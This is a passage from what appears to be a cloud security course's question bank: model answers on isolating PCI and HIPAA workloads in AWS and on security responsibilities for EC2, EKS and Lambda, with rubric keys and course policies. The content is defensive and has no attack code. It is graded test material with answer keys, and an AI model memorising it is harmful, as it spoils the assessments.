questions.answer: Account structure: Use AWS Organizations with separate OUs: (1) PCI OU: dedicated accounts for payment processing (production, staging). SCP enforces PCI-specific controls (encryption required, approved regions only, restricted service list). (2) HIPAA OU: dedicated accounts for health data processing. SCP enforces HIPAA controls (encryption, logging, approved services per BAA). (3) Shared Services OU: centralized logging, security tooling, identity. Accessible by both but containing neither PCI nor HIPAA data. (4) No PCI account should have network connectivity to HIPAA accounts and vice versa. Network architecture: Separate VPCs in separate accounts for PCI and HIPAA workloads. No VPC peering or transit gateway connections between PCI and HIPAA VPCs. Each has its own internet egress, NAT gateways, and load balancers. Shared services accessed through PrivateLink endpoints, not through network peering, ensuring no data plane connectivity between regulated environments. IAM strategy: Centralized identity in Azure AD or Okta federated to AWS. Separate IAM roles for PCI and HIPAA access. No IAM role should have access to both PCI and HIPAA accounts. Implement permission boundaries per OU that prevent cross-OU role assumption. Separate break-glass admin accounts for each regulatory environment. Monitoring approach: Centralized CloudTrail delivery to the logging account from all OUs. Separate SIEM dashboards and alert rules for PCI and HIPAA events. PCI-specific monitoring for cardholder data access patterns. HIPAA-specific monitoring for PHI access and minimum necessary compliance. Unified GuardDuty with per-account detection, feeding a central SIEM. Separate compliance dashboards for PCI QSA and HIPAA auditor showing only their respective environment.

rubric.key: Account structure enforces data separation
Network architecture prevents data mixing
IAM and monitoring approaches are regulation-aware

questions.question: Compare the security implications of deploying a web application on EC2 instances, as containers on EKS, and as Lambda functions. For each deployment model, identify the customer's security responsibilities and the top security risk specific to that model.
questions.answer: EC2 instances: Customer responsibilities: OS patching, runtime updates, application deployment, security group configuration, instance hardening (disable unnecessary services, configure host firewall), endpoint protection (EDR agent), log collection (CloudWatch agent), disk encryption. Top security risk: Unpatched operating system vulnerabilities. EC2 instances require manual or automated patch management. A missed kernel patch or library update creates a known vulnerability that attackers can exploit for initial access or privilege escalation. The customer must maintain the entire OS stack. EKS containers: Customer responsibilities: Base image selection and scanning, Kubernetes RBAC configuration, network policy definition, pod security standards enforcement, secrets management, node group OS patching (or managed node group updates), container runtime monitoring. Top security risk: Container image vulnerabilities and misconfigured Kubernetes RBAC. Container images bundle the application with all dependencies, and vulnerable dependencies in the image are exploitable in every pod using that image. Overly permissive Kubernetes RBAC (granting cluster-admin to application service accounts) enables privilege escalation from a compromised pod to full cluster control. Lambda functions: Customer responsibilities: Function code security, execution role IAM policy, event source configuration, dependency management, secrets management (no hardcoded credentials), logging configuration, API Gateway security (rate limiting, authentication). Top security risk: Event injection and overly permissive execution roles. Lambda functions process events from potentially untrusted sources (API Gateway, S3, SQS). Untrusted input that reaches shell commands or database queries without sanitization enables injection attacks. Combined with an overly permissive execution role, a single injection vulnerability can compromise the entire AWS account. Key pattern: As the deployment model abstracts more infrastructure (EC2 -> EKS -> Lambda), the customer's infrastructure security burden decreases but application-level security becomes more critical. The attack surface shifts from the OS layer to the identity and application layers.

rubric.key: Correctly identifies customer responsibilities for each model
Identifies a specific, accurate top risk for each model
Demonstrates understanding of how the security model shifts across deployment types

course_policies.late_submissions: Assignments lose 10% per day late up to 5 days. Cloud lab environments are available for a limited time; late work may not have access to the lab environment.
course_policies.collaboration: Lab exercises may be completed in assigned pairs. All written reports and quiz responses must be individual work. Team assignments require individual contribution documentation.
course_policies.academic_integrity: All cloud configurations, scripts, and analysis must be your own work or properly attributed. Sharing AWS credentials or accessing other students' cloud accounts is a violation of academic integrity and potentially federal law.
